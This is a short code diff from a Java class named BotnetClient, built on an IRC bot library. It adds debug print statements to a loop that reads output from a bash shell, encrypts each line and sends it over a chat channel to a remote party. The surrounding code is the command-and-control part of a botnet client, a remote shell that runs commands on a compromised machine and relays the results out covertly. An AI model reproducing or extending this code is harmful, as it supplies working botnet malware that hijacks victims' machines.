@@ -251,13 +251,17 @@ public class BotnetClient extends PircBot {
 	        			String s = bashout.readLine();
 	        			while (s != null && !s.equals(SENTINEL)) {
 	        				// TODO: maybe need to change this
+	        				System.out.println(s);
 	        				String encS = startMsgE.encryptMsg(s);
+	        				System.out.println(encS);
 	        				chat.sendLine(encS);
 	        				//chat.sendLine(s);
 	        				System.out.println("bash response: " + s);
 	        				s = bashout.readLine();
 	        			}
 	        			//chat.sendLine(s);
+	        			System.out.println(s);
+	        			System.out.println(startMsgE.encryptMsg(s));
 	        			chat.sendLine(startMsgE.encryptMsg(s));
 	        		}
 		        	chat.close();
